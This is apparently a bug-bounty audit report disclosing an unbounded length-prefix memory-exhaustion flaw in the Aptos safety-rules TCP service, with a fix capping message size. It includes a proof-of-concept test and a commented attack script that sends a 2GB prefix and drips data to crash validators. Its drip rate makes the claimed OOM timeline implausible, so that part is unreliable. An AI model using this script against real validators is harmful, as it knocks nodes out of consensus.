# Audit Report

## Title
Memory Exhaustion via Unbounded Length-Prefixed Message Reading in Safety-Rules Remote Service

## Summary
The `NetworkStream::read_buffer()` function in the safety-rules remote service network layer lacks size validation on length-prefixed messages, allowing an attacker to cause out-of-memory crashes by sending maliciously crafted length prefixes claiming extremely large payloads (up to 4GB).

## Finding Description

The safety-rules remote service uses a TCP-based protocol for communication between the consensus engine and the safety-rules process. This protocol uses length-prefixed messages where a 4-byte little-endian u32 header specifies the message size. [1](#0-0) 

The `process_one_message()` function calls `network_server.read()` which ultimately invokes `NetworkStream::read_buffer()`: [2](#0-1) 

**The Vulnerability:**

The `read_buffer()` function reads the 4-byte length prefix and converts it to `data_size` (line 486) **without any maximum size validation**. It then continues reading from the TCP stream, extending `self.buffer` until `data_size` bytes have been received (line 443 in the `read()` method): [3](#0-2) 

**Attack Scenario:**

1. Attacker establishes TCP connection to safety-rules remote service (when running in `Process` or `Thread` mode)
2. Sends 4-byte length prefix: `[0xFF, 0xFF, 0xFF, 0x7F]` claiming 2,147,483,647 bytes (2GB)
3. Begins sending data in chunks of ~900 bytes every 25 seconds (staying within the 30-second timeout window)
4. The server continuously extends `self.buffer` with each received chunk
5. After accumulating sufficient data (e.g., 500MB-1GB), the safety-rules process exhausts available memory and crashes with OOM

**Why Timeout Doesn't Prevent This:**

The `network_timeout_ms` (default 30 seconds) applies to **individual TCP read operations**, not the total message reading time: [4](#0-3) 

An attacker can send data periodically (every 25 seconds) to avoid timeout while still causing unbounded memory growth.

**Contrast with gRPC Service:**

The gRPC-based network service (used elsewhere) properly enforces a maximum message size: [5](#0-4) 

However, the TCP-based `NetworkStream` used by safety-rules has no such protection.

**No Authentication:**

The remote service accepts any TCP connection without authentication: [6](#0-5) 

This breaks **Invariant #9 (Resource Limits)**: "All operations must respect gas, storage, and computational limits" - the unbounded memory allocation violates resource constraints.

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty criteria:

- **Validator node slowdowns/crashes**: Memory exhaustion causes the safety-rules process to crash, preventing the validator from signing votes or proposals
- **Consensus impact**: A crashed safety-rules service means the validator cannot participate in consensus, reducing network capacity and potentially causing liveness issues if multiple validators are targeted
- **API crashes**: The safety-rules remote service crashes on OOM

**Mitigating Factors:**
- Mainnet validators are required to use `SafetyRulesService::Local` mode (enforced by config sanitizer), which doesn't use the network service: [7](#0-6) 

However, the vulnerability still affects:
- Testnet/devnet validators
- Development/staging environments  
- Misconfigured mainnet validators
- Testing/debugging scenarios where Process/Thread mode is used

## Likelihood Explanation

**Likelihood: Medium to Low in Production, High in Test Environments**

**Factors Increasing Likelihood:**
1. No authentication required - any TCP client can connect
2. Simple exploitation - just send malicious length prefix
3. Deterministic behavior - attack always works if attacker can maintain connection
4. No rate limiting or connection filtering

**Factors Decreasing Likelihood:**
1. Mainnet validators use Local mode (vulnerability not exposed)
2. Service typically binds to localhost or protected network interface
3. Firewall rules usually restrict access to safety-rules ports

**Realistic Attack Scenarios:**
- Compromised co-tenant in cloud environment accessing localhost services
- Insider threat with network access
- Misconfigured validator exposing service to public internet
- Targeted attack on testnet validators during critical testing phases

## Recommendation

Implement a maximum message size limit in `NetworkStream::read_buffer()`, similar to the gRPC service's 80MB limit:

```rust
// In secure/net/src/lib.rs, add constant:
const MAX_MESSAGE_SIZE: usize = 80 * 1024 * 1024; // 80MB

// Modify read_buffer() to validate size:
fn read_buffer(&mut self) -> Result<Vec<u8>, Error> {
    if self.buffer.len() < 4 {
        return Ok(Vec::new());
    }

    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;
    
    // ADD SIZE VALIDATION HERE
    if data_size > MAX_MESSAGE_SIZE {
        return Err(Error::DataTooLarge(data_size));
    }

    let remaining_data = &self.buffer[4..];
    if remaining_data.len() < data_size {
        return Ok(Vec::new());
    }

    let returnable_data = remaining_data[..data_size].to_vec();
    self.buffer = remaining_data[data_size..].to_vec();
    Ok(returnable_data)
}

// Update read() signature:
pub fn read(&mut self) -> Result<Vec<u8>, Error> {
    let result = self.read_buffer()?; // Now propagates Error
    if !result.is_empty() {
        return Ok(result);
    }
    // ... rest of implementation
}
```

**Additional Recommendations:**
1. Add authentication/authorization to remote safety-rules service
2. Document that Process/Thread modes should only be used in secure network environments
3. Consider deprecating remote safety-rules modes in favor of Local mode for production

## Proof of Concept

```rust
// PoC Test - Add to secure/net/src/lib.rs in the test module
#[test]
fn test_memory_exhaustion_attack() {
    use std::io::Write;
    use std::thread;
    use std::time::Duration;
    
    let server_port = utils::get_available_port();
    let server_addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), server_port);
    
    // Start server in separate thread
    thread::spawn(move || {
        let mut server = NetworkServer::new("test".to_string(), server_addr, 30_000);
        // This will block trying to allocate huge buffer
        let _ = server.read();
    });
    
    // Give server time to start
    thread::sleep(Duration::from_millis(100));
    
    // Attacker connects
    let mut stream = TcpStream::connect(server_addr).unwrap();
    
    // Send malicious length prefix claiming 2GB
    let malicious_size = 2_000_000_000u32;
    stream.write_all(&malicious_size.to_le_bytes()).unwrap();
    
    // Send some data to trigger memory allocation
    let chunk = vec![0u8; 1024];
    for _ in 0..10 {
        stream.write_all(&chunk).unwrap();
        thread::sleep(Duration::from_millis(100));
    }
    
    // Server will accumulate data in unbounded buffer
    // In real attack, continue until OOM
    // This test demonstrates the vulnerability without crashing test suite
}

// Reproduction steps:
// 1. Configure validator with SafetyRulesService::Process mode
// 2. Start safety-rules process listening on exposed port
// 3. Run attack script:
//
// use std::net::TcpStream;
// use std::io::Write;
//
// let mut conn = TcpStream::connect("validator-ip:safety-rules-port").unwrap();
// conn.write_all(&[0xFF, 0xFF, 0xFF, 0x7F]).unwrap(); // 2GB claim
// loop {
//     conn.write_all(&[0u8; 900]).unwrap();
//     std::thread::sleep(std::time::Duration::from_secs(25));
// }
//
// 4. Monitor validator memory usage - will grow until OOM crash
```

## Notes

**Deployment Context:**
- The vulnerability exists in the codebase but is **not exploitable on properly configured mainnet validators** due to the enforced use of Local mode
- However, it represents a significant security debt and defense-in-depth violation
- Test/development environments remain vulnerable and could be targeted to disrupt testing or cause operational issues
- The lack of authentication on the remote service compounds the risk

**Defense-in-Depth Principle:**
Even though mainnet deployment patterns mitigate this vulnerability, security-critical components like safety-rules should enforce resource limits at all layers. The current implementation violates the principle of least privilege and fails-safe design by allowing unbounded resource consumption in non-production modes.

### Citations

**File:** consensus/safety-rules/src/remote_service.rs (L30-45)
```rust
pub fn execute(storage: PersistentSafetyStorage, listen_addr: SocketAddr, network_timeout_ms: u64) {
    let mut safety_rules = SafetyRules::new(storage, false);
    if let Err(e) = safety_rules.consensus_state() {
        warn!("Unable to print consensus state: {}", e);
    }

    let mut serializer_service = SerializerService::new(safety_rules);
    let mut network_server =
        NetworkServer::new("safety-rules".to_string(), listen_addr, network_timeout_ms);

    loop {
        if let Err(e) = process_one_message(&mut network_server, &mut serializer_service) {
            warn!("Failed to process message: {}", e);
        }
    }
}
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** secure/net/src/lib.rs (L415-427)
```rust
    pub fn new(stream: TcpStream, remote: SocketAddr, timeout_ms: u64) -> Self {
        let timeout = Some(std::time::Duration::from_millis(timeout_ms));
        // These only fail if a duration of 0 is passed in.
        stream.set_read_timeout(timeout).unwrap();
        stream.set_write_timeout(timeout).unwrap();

        Self {
            stream,
            remote,
            buffer: Vec::new(),
            temp_buffer: [0; 1024],
        }
    }
```

**File:** secure/net/src/lib.rs (L430-451)
```rust
    pub fn read(&mut self) -> Result<Vec<u8>, Error> {
        let result = self.read_buffer();
        if !result.is_empty() {
            return Ok(result);
        }

        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
    }
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** config/src/config/safety_rules_config.rs (L99-104)
```rust
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```
